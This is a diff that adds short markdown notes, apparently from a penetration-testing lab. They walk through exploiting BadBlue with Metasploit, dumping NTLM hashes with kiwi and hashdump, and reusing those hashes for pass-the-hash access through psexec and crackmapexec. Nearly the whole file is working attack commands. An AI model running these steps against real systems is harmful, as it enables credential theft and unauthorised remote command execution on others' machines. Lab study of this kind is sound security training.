@@ -1,0 +1,23 @@
+- using metasploit
+    - msfconsole
+    - search badblue
+    - use exploit/windows/http/badblue_passthru
+    - setg RHOSTS VICTIM_IP
+    - run
+    - load kiwi
+    - copy the ntlm hash of administrator and students
+    - hashdump
+        - hash style: 
+            - the first hash is the LM hash and it is the same for all users and the second one is the NTLM hash of the particular user
+            - copy the tho hash to the atacker machine
+    - in another msfconsole
+        - search psexec
+        - use exploit/windows/smb/psexec
+        - set LPORT 4445
+        - set SMBUser Administrator
+        - set SMBPASS NT_HASH:NTLM_USER_HASH
+        - set target Native\ upload
+        - run
+
+- using crackmapexec
+    - crackmapexec smb VICTIM_IP -u Administrator -H "NTLM_USER_HASH" -x "SOME_RANDOM_COMMAND"
